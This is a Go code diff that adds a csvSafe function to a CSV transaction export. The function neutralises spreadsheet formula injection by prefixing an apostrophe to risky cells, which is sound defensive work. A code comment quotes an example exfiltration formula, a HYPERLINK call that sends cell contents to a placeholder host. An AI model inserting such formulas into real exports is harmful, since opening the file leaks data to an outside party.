@@ -75,10 +75,10 @@ func (s *ReportService) TransactionsCSV(orgID uuid.UUID, f dto.TransactionFilter
 		}
 		record := []string{
 			t.Date.Format("2006-01-02"),
-			t.Description,
+			csvSafe(t.Description),
 			translateType(t.Type),
-			category,
-			account,
+			csvSafe(category),
+			csvSafe(account),
 			reais(t.Amount),
 			boolPT(t.Paid),
 		}
@@ -88,6 +88,18 @@ func (s *ReportService) TransactionsCSV(orgID uuid.UUID, f dto.TransactionFilter
 	}
 	cw.Flush()
 	return cw.Error()
+}
+
+// csvSafe neutralises spreadsheet formulas in free text. Descriptions come
+// from bank statements (an OFX NAME/MEMO, the name on a PIX) or from other
+// members, and a cell such as =HYPERLINK("http://x/?"&A1;"clique") runs when
+// the CSV is opened in Excel or LibreOffice. A leading apostrophe makes it
+// plain text (OWASP "CSV injection").
+func csvSafe(v string) string {
+	if v != "" && strings.ContainsRune("=+-@\t\r", rune(v[0])) {
+		return "'" + v
+	}
+	return v
 }
 
 // reais converts cents to a "1234,56" string (comma decimal separator).
